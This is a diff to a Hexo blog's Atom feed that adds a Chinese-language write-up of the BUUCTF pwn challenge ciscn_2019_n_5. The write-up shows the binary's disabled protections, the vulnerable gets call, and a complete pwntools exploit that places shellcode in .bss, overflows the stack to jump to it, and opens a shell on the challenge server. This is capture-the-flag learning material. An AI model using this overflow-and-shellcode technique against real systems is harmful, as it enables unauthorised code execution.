@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2022-01-16T13:54:33.781Z</updated>
+  <updated>2022-01-16T14:48:48.005Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,29 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>buuctf-ciscn_2019_n_5</title>
+    <link href="http://example.com/2022/01/16/buuctf-ciscn-2019-n-5/"/>
+    <id>http://example.com/2022/01/16/buuctf-ciscn-2019-n-5/</id>
+    <published>2022-01-16T14:48:05.000Z</published>
+    <updated>2022-01-16T14:48:48.005Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="ciscn-2019-n-5"><a href="#ciscn-2019-n-5" class="headerlink" title="ciscn_2019_n_5"></a>ciscn_2019_n_5</h1><p>保护全没开</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>main函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> text[<span class="number">30</span>]; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;tell me your name&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, name, <span class="number">0x64</span>uLL);<span class="comment">//你第一次写入的值会到name的bss段里面</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;wow~ nice name!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you want to say to me?&quot;</span>);</span><br><span class="line">  gets(text, name);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>你第一次写入的值会到name的bss段里面，第2次会有溢出0x20+8的溢出字符,那我们可以在第一个写入到name的bss段里面,然后通过第2次输入溢出来造成溢出,然后rdi指向bss段来执行shellcode</p><p>exp如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25985</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./ciscn_2019_n_5&#x27;)</span></span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">name=<span class="number">0x601080</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;name\n&quot;</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.recvuntil(<span class="string">&quot;?\n&quot;</span>)</span><br><span class="line">payload=<span class="string">b&quot;A&quot;</span>*<span class="number">0x28</span>+p64(name)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;ciscn-2019-n-5&quot;&gt;&lt;a href=&quot;#ciscn-2019-n-5&quot; class=&quot;headerlink&quot; title=&quot;ciscn_2019_n_5&quot;&gt;&lt;/a&gt;ciscn_2019_n_5&lt;/h1&gt;&lt;p&gt;保护全没开&lt;/p&gt;
+&lt;figure clas</summary>
+      
+    
+    
+    
+    
+    <category term="buuctf-pwn" scheme="http://example.com/tags/buuctf-pwn/"/>
+    
+  </entry>
   
   <entry>
     <title>buuctf-level2_x64</title>
